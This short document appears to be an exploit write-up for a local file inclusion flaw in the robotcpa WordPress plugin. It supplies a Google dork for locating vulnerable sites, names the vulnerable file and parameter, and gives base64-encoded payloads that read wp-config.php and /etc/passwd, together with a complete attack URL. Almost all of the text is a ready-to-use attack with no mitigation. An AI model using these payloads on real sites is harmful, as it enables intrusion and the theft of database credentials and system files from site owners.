# Google Dork: inurl:"/wp-content/plugins/robotcpa/"

The affected file is f.php and the get-parameter "l" is vulnerable to local file inclusion.
We just need to base64 encode our injection.
Like that :
php://filter/resource=./../../../wp-config.php
cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==
or
file:///etc/passwd
ZmlsZTovLy9ldGMvcGFzc3dk

our injection look then like that :
http://domain.com/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk
and we can see the content of the passwd file.
